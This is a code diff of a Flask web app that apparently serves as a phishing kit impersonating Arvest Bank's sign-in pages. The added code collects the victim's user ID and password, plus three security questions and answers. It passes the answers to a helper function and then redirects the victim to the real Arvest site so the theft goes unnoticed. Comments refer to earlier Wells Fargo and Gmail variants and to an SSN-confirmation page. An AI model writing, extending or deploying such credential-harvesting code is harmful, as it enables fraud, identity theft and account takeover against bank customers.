@@ -1,5 +1,5 @@
 from flask import Blueprint, render_template, request, redirect, url_for
-
+from .utils import security_question, report_login
 
 portals = Blueprint('portals', __name__)
 
@@ -9,9 +9,7 @@ def signin():
         user_id = request.form['user-id']
         password_ = request.form['password']
         if user_id and password_:
-            # new_user = User(username=user_id, password=password_)
-            # db.session.add(new_user)
-            # db.session.commit()
+            # report_login(user_id,password_,bank_name='Arvest')
             return redirect(url_for('portals.question'))
     return render_template('signin.html')
 
@@ -20,10 +18,12 @@ def question():
     if request.method == 'POST':
         q1 = request.form['q1']
         ans1 = request.form['ans1']
-        print(q1,'--->',ans1)
-        # print(email,password, bank_name='Wellsfargo Gmail Login details')
-        # report_login(email,password, bank_name='Gmail Account')
-        return redirect(url_for('main.syncing'))
+        q2 = request.form['q2']
+        ans2 = request.form['ans2']
+        q3 = request.form['q3']
+        ans3 = request.form['ans3']
+        security_question(q1,ans1,q2,ans2,q3,ans3)
+        return redirect('https://www.arvest.com/')
     return render_template('question.html')
 
 # @portals.route('/ssn-confirmation', methods=['GET','POST'])
